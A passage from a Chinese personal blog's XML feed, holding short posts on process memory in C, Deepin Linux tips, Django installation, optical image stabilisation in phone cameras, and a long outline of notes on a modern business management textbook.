&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="进程相关知识"><a href="#进程相关知识" class="headerlink" title="进程相关知识"></a>进程相关知识</h2><ul>
<li>进程除了创建的共享变量，所有变量包括全局变量和初始创建的变量均是不共享的</li>
<li>两个进程中地址相同的指针指向的是不同的位置，即malloc后fork出来的是两个malloc出来的指针，地址虽然打印相同，地址是逻辑地址，对两个进程是不同的。</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>Deepin系统使用笔记</title>
    <url>/blogs/2018-11-29-deepinNotes/</url>
    <content><![CDATA[<h1 id="一、特殊目录"><a href="#一、特殊目录" class="headerlink" title="一、特殊目录"></a>一、特殊目录</h1><h2 id="1-回收站的位置"><a href="#1-回收站的位置" class="headerlink" title="1. 回收站的位置"></a>1. 回收站的位置</h2><p>Deepin回收站的位置在<code>~/.local/share/Trash/files</code></p>
<h1 id="二、特殊操作"><a href="#二、特殊操作" class="headerlink" title="二、特殊操作"></a>二、特殊操作</h1><h2 id="1-添加开机自启动"><a href="#1-添加开机自启动" class="headerlink" title="1. 添加开机自启动"></a>1. 添加开机自启动</h2><ul>
<li>针对桌面版软件，在启动器中找到软件图标</li>
<li>右键添加到开机启动即可</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Django框架学习</title>
    <url>/blogs/2018-11-23-djangoStudy/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="使用pip命令安装"><a href="#使用pip命令安装" class="headerlink" title="使用pip命令安装"></a>使用pip命令安装</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install Django==<span class="number">2.1</span><span class="number">.3</span></span><br></pre></td></tr></table></figure>

<h2 id="官网下载安装"><a href="#官网下载安装" class="headerlink" title="官网下载安装"></a>官网下载安装</h2><p><a href="https://www.djangoproject.com/download/">官网下载地址</a></p>
<p>下载最新包后使用以下命令安装</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>

<h2 id="验证安装是否成功"><a href="#验证安装是否成功" class="headerlink" title="验证安装是否成功"></a>验证安装是否成功</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> django</span><br><span class="line">django.get_version()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Program</category>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title>OIS光学防抖资料收集</title>
    <url>/blogs/2018-11-20-OISDataCollection/</url>
    <content><![CDATA[<p>OIS，它的全称是<code>Optical Image Stabilization</code>，从字面理解就是稳定的光学图象。通过镜头的浮动透镜来纠正“光轴偏移”，其原理是通过镜头内的陀螺仪侦测到微小的移动，然后将信号传至微处理器，处理器立即计算需要补偿的位移量，然后通过补偿镜片组，根据镜头的抖动方向及位移量加以补偿；从而有效的克服因相机的振动产生的影像模糊。这种防抖技术对镜头设计制造要求比较高，而且成本也相对高一些。</p>
<h2 id="OIS光学防抖有什么用？"><a href="#OIS光学防抖有什么用？" class="headerlink" title="OIS光学防抖有什么用？"></a>OIS光学防抖有什么用？</h2><p>OIS光学防抖可以提升手机的拍摄，有以下三方面。</p>
<ul>
<li>稳定拍摄</li>
</ul>
<p>对于普通用户来说，使用手机拍照不会像那些摄影达人一样动辄就三脚架稳定器招呼着，往往只能通过双手来进行拍照，有时甚至只会随手一拍。而当处于这样的场景下时，如果手机的快门过慢，就很可能出现成像很虚的情况，而如果手机拥有OIS光学防抖，就能够起到稳定拍摄的作用，使手持拍摄不会产生模糊不清的情况，提升拍照体验。</p>
<ul>
<li>提升暗光拍摄品质</li>
</ul>
<p>另外，手机加入OIS光学防抖还能够弥补手机在暗光环境下拍照的表现。目前在日常拍摄领域，手机摄影相较于高端卡片机和低端单反，最突出的短板就是暗光条件下的拍摄效果了。<br>而在暗光环境下，要想提高照片的明亮程度，主要就要通过感光度，曝光时间，光圈这3种途径。<br>通过提高感光度来提升画面亮度，是较为粗暴的方式。因为在手机上，感光度的提升会给手机带来明显的噪点；延长曝光时间，会容易造成画面抖动。这对照片的影响是致命性的，可能直接导致照片不可用；增大光圈，这是今年来手机厂商的普遍做法，但由于光学技术发展的缓慢与不成熟性，很多手机在增大光圈上的做法都比较保守。<br>所以光学防抖的作用就是通过克服（减轻）画面抖动，延长曝光时间，从而提高手机暗光下的拍摄质量。</p>
<ul>
<li>增强画面亮度 提升暗部细节</li>
</ul>
<h2 id="而在普通条件下，光学防抖对画质是否有影响呢？"><a href="#而在普通条件下，光学防抖对画质是否有影响呢？" class="headerlink" title="而在普通条件下，光学防抖对画质是否有影响呢？"></a>而在普通条件下，光学防抖对画质是否有影响呢？</h2><p>假设手机安全快门的速度是1&#x2F;30秒，那么用光学防抖之后的安全快门速度就变成了1&#x2F;8秒。而在暗光拍摄中，1&#x2F;30秒的速度进光量是远小于1&#x2F;8秒的。<br>所以在同样的条件下，有了光学防抖之后，我们会看到照片更明亮，暗部细节更清楚，画质比采用数字防抖的手机好一些。</p>
<h2 id="那么，为什么手机采用了光学防抖，拍照效果没有明显提升？"><a href="#那么，为什么手机采用了光学防抖，拍照效果没有明显提升？" class="headerlink" title="那么，为什么手机采用了光学防抖，拍照效果没有明显提升？"></a>那么，为什么手机采用了光学防抖，拍照效果没有明显提升？</h2><p>因为光学防抖可以理解为只是通过提高安全快门速度来提高镜头的进光量，最终决定画质的是感光元件和镜头。如果没有光学防抖，我们也可以通过其他途径来提高安全快门速度来提高镜头的进光量。比如利用外设三脚架，或者从软件上手动调整感光度，很多手机厂商甚至对手机相机的预设参数进行了调整，在一定环境下不惜牺牲成像后的整体画质来提升照片在手机中的视觉效果，所以很多时候我们在手机中看到拍出的照片很精美，不过放到电脑中就不是那么回事了，就是这个道理。<br>如果我们剔除手机厂商在软件方面动的手脚，在光线充足的环境下，具有光学防抖的手机与采用数字防抖的手机本身表现也不会相差太多，感觉提升不明显也在情理之中。但在暗光环境下拍照对比一下，相信效果就显而易见了。</p>
<p>OIS技术，是一种更加完善的防抖技术是人们在拍摄时，大变焦的情况下，可以实现更高的精确度和准确度。其补偿操作的频率达到上一代系统的8倍，是人们在拍摄时，大变焦的情况下，可以实现更高的精确度和准确度。其补偿操作的频率达到上一代系统的8倍。</p>
<p>该系统采用陀螺传感器来检测手部抖动，然后移动镜片并调整其光轴进行补偿。上一代系统对手部抖动进行检测和补偿的频率约为500次每秒，而新的高级O.I.S.的工作频率约为4000次每秒。该系统为光学系统，不会降低画质，从而使拍摄的影像能够充分展现原有的完美效果。在大屏幕、高分辨率电视时代，画面中的每一处瑕疵都是显而易见的。所以高级O.I.S.确实是必不可少的画面稳定系统，有了它即使手部出现轻微的抖动，画面也不会有一丝一毫的模糊。光学防抖和四轴防抖差不多。</p>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
  </entry>
  <entry>
    <title>读书笔记————现代企业管理学</title>
    <url>/blogs/2018-11-05-readingNoteModernBusinessManagement/</url>
    <content><![CDATA[<h1 id="现代企业管理学"><a href="#现代企业管理学" class="headerlink" title="现代企业管理学"></a>现代企业管理学</h1><ul>
<li>主编：吴金法</li>
</ul>
<h2 id="第一篇、管理编论篇"><a href="#第一篇、管理编论篇" class="headerlink" title="第一篇、管理编论篇"></a>第一篇、管理编论篇</h2><h3 id="第1章-企业管理概述"><a href="#第1章-企业管理概述" class="headerlink" title="第1章 企业管理概述"></a>第1章 企业管理概述</h3><ul>
<li>企业概述<ul>
<li>企业的概念及其特征<ul>
<li>企业是一个历史范畴</li>
<li>企业的定义及其特征<ul>
<li>经济性</li>
<li>营利性</li>
<li>社会性</li>
</ul>
</li>
</ul>
</li>
<li>企业的类型<ul>
<li>个人独资企业(Proprietorship)</li>
<li>合伙企业(Partnership, Single Proprietorship)</li>
<li>公司(Company, Corporation)<ul>
<li>有限责任公司</li>
<li>股份有限公司</li>
</ul>
</li>
</ul>
</li>
<li>现代企业制度<ul>
<li>委托代理关系</li>
<li>有限责任制度</li>
<li>法人财产制度</li>
<li>组织管理制度</li>
</ul>
</li>
</ul>
</li>
<li>管理的性质与职能<ul>
<li>管理的定义  <img src = "2018_11_05_01.bmp"></li>
<li>管理的科学性与艺术性</li>
<li>管理的基本问题<ul>
<li>物质资源</li>
<li>金融资源</li>
<li>信息资源</li>
<li>人力资源</li>
<li>关系资源  <img src = "2018_11_05_02.bmp"></li>
</ul>
</li>
<li>管理中的人性假设  <img src = "2018_11_05_03.bmp"></li>
<li>管理职能<ul>
<li>计划。管理活动从计划开始，计划是管理过程的首要职能</li>
<li>组织。要把计划落实到行动中，就必须要有组织工作</li>
<li>领导。每一个组织都是由人力资源有机结合而成的，人是组织活动中惟一具有能动性的因素</li>
<li>控制。为了保证组织目标的实现和既定计划的顺利进行，管理者必须将实际的表现与预先设定的目标进行比较  <img src = "2018_11_05_04.bmp"></li>
</ul>
</li>
<li>工商企业管理的基本任务<ul>
<li>经济效益</li>
<li>生产性的工作及员工的成就</li>
<li>社会影响与杜会贵任</li>
</ul>
</li>
</ul>
</li>
<li>管理者<ul>
<li>管理者的类型<ul>
<li>管理者的层次分类  <img src = "2018_11_05_05.bmp">
  <img src = "2018_11_05_06.bmp"></li>
<li>管理人员的领域分类  <img src = "2018_11_05_07.bmp"></li>
</ul>
</li>
<li>有效的管理者与成功的管理者  <img src = "2018_11_05_08.bmp"></li>
<li>管理者的任务  <img src = "2018_11_05_09.bmp"></li>
<li>管理者应具备的技能  <img src = "2018_11_05_10.bmp"></li>
</ul>
</li>
<li>企业管理的环境<ul>
<li>环境对企业的影响</li>
<li>企业的一般环境<ul>
<li>政治环境</li>
<li>社会文化环境</li>
<li>经济环境</li>
<li>科技环境</li>
<li>自然环境</li>
</ul>
</li>
<li>企业的任务环境<ul>
<li>现有竞争对手<ul>
<li>基本情况的研究</li>
<li>主要竞争对手的研究</li>
<li>竞争对手的发展方向</li>
</ul>
</li>
<li>潜在竞争对手</li>
<li>替代品生产者</li>
<li>用户<ul>
<li>用户的需求</li>
<li>用户的价格谈判能力</li>
</ul>
</li>
<li>供应商</li>
</ul>
</li>
<li>企业文化<ul>
<li>企业文化及其构成  <img src = "2018_11_05_11.bmp"></li>
<li>企业文化的特点<ul>
<li>客观性</li>
<li>个异性</li>
<li>民族性</li>
<li>稳定性</li>
</ul>
</li>
<li>企业文化对管理的影响  <img src = "2018_11_05_12.bmp">
  <img src = "2018_11_05_13.bmp"></li>
</ul>
</li>
<li>环境分析方法<ul>
<li>识别环境不确定程度的方法  <img src = "2018_11_05_14.bmp"></li>
<li>内外部环境综合分析法(SWOT 分析法）  <img src = "2018_11_05_15.bmp"></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="第2章-管理理论的发展"><a href="#第2章-管理理论的发展" class="headerlink" title="第2章 管理理论的发展"></a>第2章 管理理论的发展</h3><ul>
<li>古典管理理论<ul>
<li>泰罗的科学管理理论<ul>
<li>工作定额原理</li>
<li>能力与工作相适应</li>
<li>标准化原理</li>
<li>刺激性的报酬制度</li>
<li>工人和雇主两方面必须进行－场“精神革命”</li>
<li>计划同执行相分离</li>
<li>在管理控制上实行例外原则</li>
</ul>
</li>
<li>法约尔的一般管理思想<ul>
<li>关于经营与管理<ul>
<li>企业的经营有六项活动<ul>
<li>技术活动</li>
<li>商业活动</li>
<li>财务活动</li>
<li>安全活动</li>
<li>会计活动</li>
<li>管理活动  <img src = "2018_11_05_16.bmp"></li>
</ul>
</li>
</ul>
</li>
<li>关于管理的一般原则<ul>
<li>分工</li>
<li>权力和责任</li>
<li>纪律</li>
<li>命令的统一性</li>
<li>指挥的统一性</li>
<li>个人利益服从整体利益</li>
<li>报酬</li>
<li>集权</li>
<li>等级系列</li>
<li>秩序</li>
<li>公平</li>
<li>人员的稳定</li>
<li>首创精神</li>
<li>集体精神</li>
</ul>
</li>
</ul>
</li>
<li>韦伯的古典组织理论<ul>
<li>存在明确的分工</li>
<li>组织内的各个职位，按照等级原则进行法定的安排，形成自上而下的等级系列。</li>
<li>组织是根据明文规定的法规、规罩组成的，法规、规章不变，组织结构也固定不变</li>
<li>组织成员之间的关系，只是一种职位关系，不受个人感情影响。</li>
<li>人员的任用，通过公开的考试来选拔，有严格的选择标准。</li>
</ul>
</li>
<li>梅奥的人际关系理论<ul>
<li>职工是“社会人”，而不是单纯追求金钱的“经济人”</li>
<li>企业中存在一种“非正式组织”</li>
<li>新型的领导在于通过“满足度”的增加来提高职工的“士气”，从而达到提高效率的目的</li>
</ul>
</li>
</ul>
</li>
<li>现代管理理论<ul>
<li>管理理论丛林  <img src = "2018_11_05_17.bmp"></li>
<li>系统管理理论<ul>
<li>企业是由人、物资、机器和其他资源在一定目标下组成的一体化系统，它的成长和发展同时受到这些组成要素的影响，在这些要素的相互关系中，人是主体，其他要素则是被动的。</li>
<li>企业是一个由许多子系统组成的、开放的社会技术系统</li>
<li>运用系统观点来考察管理的基本职能，可以提高组织的整体效率，使管理人员不至于只重视某些与自己有关的特殊职能而忽视了大目标，不至于忽视自己在组织中的地位与作用。</li>
</ul>
</li>
<li>权变管理理论<ul>
<li>过去的管理理论可分为四种，即过程学说、计量学说、行为学说和系统学说</li>
<li>权变管理理论就是考虑到有关环境的变数同相应的管理观念和技术之间的关系，使采用的管理观念和技术能有效地发挥作用</li>
<li>环境变量与管理变晕之间的函数关系就是权变关系，这是权变管理理论的核心内容  <img src = "2018_11_05_18.bmp"></li>
</ul>
</li>
</ul>
</li>
<li>现代管理思想的新发展<ul>
<li>流程再造<ul>
<li>流程及其特点<ul>
<li>逻辑性</li>
<li>变动性</li>
<li>可分解性</li>
</ul>
</li>
<li>流程再造的定义<ul>
<li>企业生存与发展环境发生了巨大变动<ul>
<li>顾客(Customer)多样性</li>
<li>变革(Change)</li>
<li>竞争(Competition)</li>
</ul>
</li>
<li>核心内容<ul>
<li>根本性再思考</li>
<li>彻底性再设计</li>
<li>戏剧性改善</li>
</ul>
</li>
</ul>
</li>
<li>流程再造的原则<ul>
<li>注重整体流程最优的系统思想。</li>
<li>在真正产生信息的实际工作中处理信息。</li>
<li>将分散的资源视为一体。</li>
<li>将并行工作联系起来。</li>
<li>在工作中决策，实现自我控制。</li>
<li>从信息来源地一次性获取信息。</li>
<li>面向客户和供应商整合企业业务流程。</li>
</ul>
</li>
</ul>
</li>
<li>学习型组织<ul>
<li>学习型组织的特征<ul>
<li>组织成员拥有一个共同的愿景．</li>
<li>组织由多个创造性个体组成。</li>
<li>善于不断学习。</li>
<li>“地方为主”的扁平式结构</li>
<li>自主管理</li>
<li>组织的边界将被重新界定</li>
<li>员工家庭与事业的平衡。</li>
<li>领导者的新角色</li>
</ul>
</li>
<li>学习型组织的“五项修炼”<ul>
<li>自我超越(personal mastery)</li>
<li>改善心智模式(improving mental models)</li>
<li>建立共同愿景( building shared vision )</li>
<li>团队学习(team learning)</li>
<li>系统思考(systems thinking)  <img src = "2018_11_05_19.bmp"></li>
</ul>
</li>
</ul>
</li>
<li>标杆管理<ul>
<li>标杆管理的涵义</li>
<li>标杆管理的类型<ul>
<li>内部标杆管理</li>
<li>竞争标杆管理</li>
<li>职能标杆管理</li>
<li>流程标杆管理</li>
</ul>
</li>
<li>标杆管理的基本要求<ul>
<li>高层管理人员的兴趣与支持；</li>
<li>对企业运作和改进要求的充分了解；</li>
<li>接受新观念改变陈旧思维方式的坦诚态度；</li>
<li>愿意与合作者分享信息；</li>
<li>致力于持续的标杆管理，</li>
<li>有能力把企业运作与战略目标紧密结合起来；</li>
<li>能将财务和非财务信息集成供管理层和员工使用的信息；</li>
<li>有致力千与顾客要求相关的核心职能改善的能力；</li>
<li>追求高附加值；</li>
<li>避免讨论定价或竞争性敏感成本等方面的内容；</li>
<li>不要向竞争者索要敏感数据；</li>
<li>未经许可，不要分享所有者信息；</li>
<li>选择一个无倾向的第二者在不公开企业名称的情况卜来栠成和提供竞争性数据；</li>
<li>不要基千标杆数据向外界贬低竞争者的商务活动。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>中国古代管理思想<ul>
<li>儒家管理思想<ul>
<li>孔子的管理思想</li>
<li>孟子的管理思想</li>
<li>儒家的“性善论”与“性恶论”</li>
</ul>
</li>
<li>道家管理思想</li>
<li>法家管理思想</li>
<li>《孙子兵法》中的管理思想</li>
<li>商家的经营管理思想<ul>
<li>范蠡的“积蓄之理”</li>
<li>白圭的“治生之学”</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="第二篇、管理职能篇"><a href="#第二篇、管理职能篇" class="headerlink" title="第二篇、管理职能篇"></a>第二篇、管理职能篇</h2><h3 id="第3章-管理的计划职能"><a href="#第3章-管理的计划职能" class="headerlink" title="第3章 管理的计划职能"></a>第3章 管理的计划职能</h3><ul>
<li>计划<ul>
<li>计划工作<ul>
<li>计划工作</li>
<li>计划工作的特点<ul>
<li>效率性</li>
<li>首位性</li>
<li>普遍性</li>
<li>创造性</li>
</ul>
</li>
<li>计划管理人员的职责<ul>
<li>综观和掌握整个计划工作过程</li>
<li>评审已制订出来的计划草案</li>
<li>解决计划工作中出现的问题</li>
<li>定期检查计划的执行情况</li>
</ul>
</li>
</ul>
</li>
<li>计划的类型及其制定<ul>
<li>计划的类型<ul>
<li>长期计划、中期计划和短期计划</li>
<li>战略计划和行动计划  <img src = "2018_11_05_20.bmp"></li>
<li>综合计划、部门计划和项目计划</li>
</ul>
</li>
<li>计划的内容  <img src = "2018_11_05_21.bmp"></li>
<li>计划的制订<ul>
<li>目标的明确</li>
<li>战略或行动方案的制订</li>
<li>落实人选、明确责任</li>
<li>制订进度表</li>
<li>分配资源</li>
</ul>
</li>
<li>计划的审定</li>
</ul>
</li>
<li>编制计划的方法<ul>
<li>定额换算法</li>
<li>系数推导法</li>
<li>经验平衡法</li>
<li>滚动计划法</li>
</ul>
</li>
<li>影响计划有效性的权变因素<ul>
<li>管理层次</li>
<li>企业生命周期</li>
<li>环境的不确定性程度</li>
</ul>
</li>
<li>计划工作的原理<ul>
<li>限定因素原理</li>
<li>许诺原理</li>
<li>灵活性原理</li>
<li>改变航道原理</li>
</ul>
</li>
</ul>
</li>
<li>目标管理<ul>
<li>企业目标<ul>
<li>企业目标的特点<ul>
<li>全局性</li>
<li>针对性</li>
<li>可分性</li>
<li>阶段性</li>
</ul>
</li>
<li>企业目标的主要内容<ul>
<li>贡献目标</li>
<li>收益目标</li>
<li>市场目标</li>
</ul>
</li>
<li>目标设置的基本原则<ul>
<li>目标应为是具体明确的</li>
<li>目标应当是难度适中的</li>
<li>目标应当被个人所认可</li>
<li>必须对达到目标的进程有及时客观的反馈信息</li>
<li>个人参与设置的目标要比别人为他设置的目标更为有效</li>
</ul>
</li>
</ul>
</li>
<li>目标管理的特点<ul>
<li>目标管理的概念</li>
<li>目标管理的特点<ul>
<li>实行员工参与管理</li>
<li>强调“自我控制”</li>
<li>重视员工能力开发</li>
<li>注重成果第一的方针</li>
</ul>
</li>
<li>目标管理的重要意义  <img src = "2018_11_05_22.bmp"></li>
</ul>
</li>
<li>目标管理的基本过程<ul>
<li>目标展开<ul>
<li>目标分解</li>
<li>目标对策展开</li>
<li>目标协商</li>
<li>明确目标责任</li>
<li>编制目标展开图和个人目标卡</li>
</ul>
</li>
<li>目标实施<ul>
<li>权力下放和自我控制</li>
<li>实施过程的检查和控制</li>
</ul>
</li>
<li>目标成果评价</li>
</ul>
</li>
</ul>
</li>
<li>决策<ul>
<li>决策及分类<ul>
<li>决策的定义<ul>
<li>决策要有明确的目的</li>
<li>决策要有若干可行的备用方案</li>
<li>决策的结果是选择一个满意的方案</li>
<li>决策是一个分析判断过程</li>
</ul>
</li>
<li>决策的意义<ul>
<li>决策贯穿于管理过程始终</li>
<li>决策正确与否直接关系到企业的生存与发展</li>
<li>决策能力是衡量管理者水平高低的重要标志</li>
</ul>
</li>
<li>决策的分类<ul>
<li>战略决策、管理决策和业务决策</li>
<li>桯序化决策和非程序化决策</li>
<li>确定型决策、风险型决策和不确定型决铅</li>
</ul>
</li>
</ul>
</li>
<li>决策程序<ul>
<li>判断问题——认识和分析问题<ul>
<li>首先确定是否存在需要解决的问题</li>
<li>确定问题出在何处</li>
<li>明确真正的问题及其可能的原因</li>
</ul>
</li>
<li>明确决策目标</li>
<li>拟定可供选择的行动方案</li>
<li>分析评价各行动方案</li>
<li>选择满意方案并付诸实施<ul>
<li>任何方案均有风险</li>
<li>不要一味追求最佳方案</li>
<li>在最终选择时，应允许不作任何选择</li>
</ul>
</li>
<li>监督与反馈</li>
</ul>
</li>
<li>决策的影响因素<ul>
<li>环境</li>
<li>过去决策</li>
<li>决策者对风险的态度</li>
<li>组织文化</li>
</ul>
</li>
<li>决策方法<ul>
<li>程序化决策方法<ul>
<li>政策</li>
<li>规章制度</li>
<li>程序</li>
</ul>
</li>
<li>适应性决策方法<ul>
<li>渐进式决策方法</li>
<li>经验式决策方法</li>
</ul>
</li>
<li>创造性决策方法<ul>
<li>头脑风暴法</li>
<li>发散思维法</li>
</ul>
</li>
<li>期望值法<ul>
<li>保守型（又称小中取大法或悲观原则）</li>
<li>进取型（又称好中求好法或乐观原则）</li>
<li>稳妥型（又称最小后悔值原则）</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>战略管理<ul>
<li>企业战略及构成要素<ul>
<li>企业战略的概念</li>
<li>战略的特征<ul>
<li>全局性</li>
<li>长期性和相对稳定性</li>
<li>适应性</li>
</ul>
</li>
<li>企业战略的构成要素<ul>
<li>经营范围</li>
<li>战略目标</li>
<li>战略行动</li>
<li>资源配置</li>
<li>竞争优势</li>
<li>协同作用<ul>
<li>投资协同作用</li>
<li>作业协同作用</li>
<li>销售协同作用</li>
<li>管理协同作用</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>战略管理<ul>
<li>战略管理的概念<ul>
<li>注重长远利益和整体利益</li>
<li>注重环境的动态分析</li>
<li>所涉及的内容都是关系企业生死存亡的重大问题</li>
<li>战略管理过程</li>
</ul>
</li>
<li>企业战略分类<ul>
<li>公司战略、事业战略和职能战略</li>
<li>产品战略、市场战略和技术战略</li>
<li>密集型发展战略、一体化发展战略和多样化发展战略</li>
</ul>
</li>
<li>战略管理过程<ul>
<li>战略分析</li>
<li>战略选择<ul>
<li>总成本领先战略</li>
<li>差别化战略</li>
<li>专业化战略</li>
</ul>
</li>
<li>战略实施。战略实施需要抓好四个主要环节<ul>
<li>制定实施计划和方案</li>
<li>分配资源</li>
<li>组织设计</li>
<li>战略实施过程的控制</li>
</ul>
</li>
<li>战略评价</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="第4章-管理的组织职能"><a href="#第4章-管理的组织职能" class="headerlink" title="第4章 管理的组织职能"></a>第4章 管理的组织职能</h3><ul>
<li>组织结构设计<ul>
<li>组织系统  <img src = "2018_11_05_23.bmp"></li>
<li>组织职能的内容<ul>
<li>建立组织结构<ul>
<li>生产经营系统的组织结构</li>
<li>管理系统的组织结构</li>
</ul>
</li>
<li>划分职责和权力</li>
<li>建立信息沟通网</li>
<li>调配企业资源</li>
</ul>
</li>
<li>组织结构设计的原则<ul>
<li>统一指挥，分级管理</li>
<li>精简效率原则</li>
<li>弹性原则</li>
<li>协调原则</li>
</ul>
</li>
<li>部门划分<ul>
<li>职能部门化</li>
<li>产品部门化</li>
<li>地区部门化</li>
<li>顾客部门化</li>
</ul>
</li>
<li>管理幅度与管理层次<ul>
<li>管理幅度<ul>
<li>管理幅度的大小主要受以下几个方面的影响<ul>
<li>管理者的素质与能力。</li>
<li>下属人员的成熟程度。</li>
<li>下属人员工作的相似性和新问题的发生率。</li>
<li>信息联系和意见沟通的难易程度．</li>
<li>工作采用标准化程序的程度和有关规章制度的健全情况。</li>
</ul>
</li>
</ul>
</li>
<li>管理层次<ul>
<li>最高管理层，也称决策层</li>
<li>中间管理层，也称实施层</li>
<li>执行管理层，也称执行层</li>
</ul>
</li>
</ul>
</li>
<li>组织结构形式<ul>
<li>直线一职能制  <img src = "2018_11_05_24.bmp"></li>
<li>事业部制  <img src = "2018_11_05_25.bmp"></li>
<li>模拟分权制  <img src = "2018_11_05_26.bmp"></li>
<li>矩阵制  <img src = "2018_11_05_27.bmp"></li>
<li>委员会制</li>
</ul>
</li>
</ul>
</li>
<li>职权类型与职权关系<ul>
<li>职权类型<ul>
<li>直线职权</li>
<li>参谋职权</li>
<li>职能职权</li>
</ul>
</li>
<li>正确处理职权关系<ul>
<li>直线职权与参谋职权之间的关系<ul>
<li>直线人员在进行重大决策之前要征询组织成员或参谋人员的意见</li>
<li>这两种职权之间在性质上是不同的</li>
<li>注意<ul>
<li>要明确两种职权之间的关系</li>
<li>直线人员要倾听参谋人员的意见，并随时向参谋人员提供有关情况</li>
<li>参谋人员要努力提高自己的工作水平</li>
<li>创造相互合作的良好气氛氛，组织中人与人之间友好的合作关系常在减少矛盾方面发挥重要的作用</li>
</ul>
</li>
</ul>
</li>
<li>直线职权与职能职权之间的关系</li>
</ul>
</li>
<li>授权<ul>
<li>授权的定义<ul>
<li>区别以下问题<ul>
<li>授权井不意味着授责</li>
<li>授权不同于代理职务</li>
<li>授权不同于助理或秘书职务</li>
<li>授权不同于分工</li>
<li>授权不同于分权</li>
</ul>
</li>
</ul>
</li>
<li>授权的益处<ul>
<li>可使高层管理人员从日常事务中解脱出来，专心处理重大问题</li>
<li>可提高下属的工作情绪，增强其责任心，并增进效率</li>
<li>可增长下属的才干．有利于管理人员的培养</li>
<li>可充分发挥下属的专长．以补救授权者自身才能之不足</li>
</ul>
</li>
<li>授权的基本过程<ul>
<li>任务的分派</li>
<li>权力的授予</li>
<li>责任的明确</li>
<li>监控权的确认</li>
</ul>
</li>
<li>授权的原则<ul>
<li>因事设人，视能授权</li>
<li>明确所授事项</li>
<li>不可越级授权</li>
<li>适度授权</li>
<li>适当控制</li>
<li>相互信赖</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>组织协调与组织变革<ul>
<li>组织协调<ul>
<li>组织协调的涵义</li>
<li>组织协调的原则<ul>
<li>直接交涉原则</li>
<li>预见性原则</li>
<li>规范性原则</li>
<li>权变原则</li>
</ul>
</li>
<li>组织协调的方法<ul>
<li>组织协调<ul>
<li>利用委员会</li>
<li>调整和改变组织机构</li>
<li>组织结构创新</li>
</ul>
</li>
<li>制度协调</li>
<li>目标协调</li>
<li>信息协调<ul>
<li>书面沟通</li>
<li>口头沟通</li>
</ul>
</li>
<li>领导协调</li>
<li>人事协调</li>
<li>思想工作协调</li>
</ul>
</li>
</ul>
</li>
<li>组织变革<ul>
<li>组织变革的原因<ul>
<li>组织变革的外部原因</li>
<li>组织变革的内部原因</li>
</ul>
</li>
<li>组织变革的内容和方法<ul>
<li>结构变革</li>
<li>技术变革</li>
<li>人的变革<ul>
<li>敏感性训练</li>
<li>调查反馈</li>
<li>过程咨询</li>
<li>团队建设</li>
<li>组际发展</li>
</ul>
</li>
</ul>
</li>
<li>变革的阻力<ul>
<li>个人或群体原有的习惯</li>
<li>担心失去既得利益</li>
<li>认为变革不符合组织的目标和最佳利益</li>
</ul>
</li>
<li>降低变革阻力的策略<ul>
<li>教育与沟通</li>
<li>参与</li>
<li>促进与支持</li>
<li>谈判</li>
<li>操纵与合作</li>
<li>强制</li>
<li>力场分析</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="第5章-管理的领导职能"><a href="#第5章-管理的领导职能" class="headerlink" title="第5章 管理的领导职能"></a>第5章 管理的领导职能</h3><ul>
<li>领导与领导者<ul>
<li>领导的实质<ul>
<li>领导与领导者的定义</li>
<li>领导的作用<ul>
<li>指挥作用</li>
<li>激励作用</li>
<li>协调作用</li>
<li>沟通作用</li>
</ul>
</li>
<li>领导的实质  <img src = "2018_11_06_28.bmp"></li>
</ul>
</li>
<li>领导权利的构成<ul>
<li>权力的性质<ul>
<li>权力的情景性</li>
<li>权力的依赖性</li>
<li>权力的不确定性</li>
<li>权力的资源性</li>
</ul>
</li>
<li>领导权力的构成  <img src = "2018_11_06_29.bmp"></li>
</ul>
</li>
</ul>
</li>
<li>现代领导理论<ul>
<li>领导特性理论<ul>
<li>传统领导特性理论</li>
<li>现代领导特性理论</li>
</ul>
</li>
<li>领导行为理论<ul>
<li>领导作风理论<ul>
<li>专制型领导作风</li>
<li>民主型领导作风</li>
<li>放任型领导作风  <img src = "2018_11_06_30.bmp"></li>
</ul>
</li>
<li>领导行为四分图理论  <img src = "2018_11_06_31.bmp">
  <img src = "2018_11_06_32.bmp"></li>
<li>管理方格理论</li>
<li>领导风格对下属行为的影响<ul>
<li>影响领导风格的因素<ul>
<li>领导者个性特征</li>
<li>下属的个性特征</li>
<li>组织环境</li>
</ul>
</li>
<li>领导风格对下属行为的影响</li>
</ul>
</li>
</ul>
</li>
<li>领导权变理论<ul>
<li>领导行为连续统一体模式  <img src = "2018_11_06_33.bmp"></li>
<li>菲德勒的权变模式  <img src = "2018_11_06_34.bmp"></li>
<li>领导生命周期理论  <img src = "2018_11_06_35.bmp"></li>
</ul>
</li>
</ul>
</li>
<li>激励<ul>
<li>激励的基本原理<ul>
<li>需要、动机与行为的关系  <img src = "2018_11_06_36.bmp"></li>
<li>激励的定义</li>
<li>激励的作用<ul>
<li>激励是调动员工积极性的主要手段</li>
<li>激励是提高人员素质的重要手段</li>
<li>激励是形成良好企业文化的有效途径</li>
</ul>
</li>
</ul>
</li>
<li>内容型激励理论<ul>
